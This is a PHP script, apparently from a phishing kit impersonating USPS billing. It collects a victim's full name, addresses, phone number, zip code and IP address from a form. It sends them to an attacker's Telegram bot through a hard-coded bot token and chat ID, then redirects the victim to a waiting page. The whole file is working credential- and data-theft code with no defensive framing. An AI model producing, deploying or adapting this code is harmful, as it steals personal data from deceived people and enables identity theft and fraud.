<?php

include "anti/getip.php";

$message = "
[<<----------||||MAFAKEN.BILLING||||-------->>]\n• Full Name : ".$_POST['fname']."\n• Address 1 : ".$_POST['add']."\n• Address 2 : ".$_POST['secadd']."\n• City      : ".$_POST['city']."\n• state  : ".$_POST['state']."\n• zip Code  : ".$_POST['zip']."\n• Phone num  : ".$_POST['phone']."\n• IP      : ".$requester_IP."\n[<<----------||||MAFAKEN.USPS||||-------->>]\n";

$token = "1302432915:AAHIh7JFVX3vOTOs5MvMtYbO3mJVeShoecQ";
$data = [
    'text' => $message,
    'chat_id' => '1096335592'
];
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
HEADER("Location: ./wait/index.html");
?>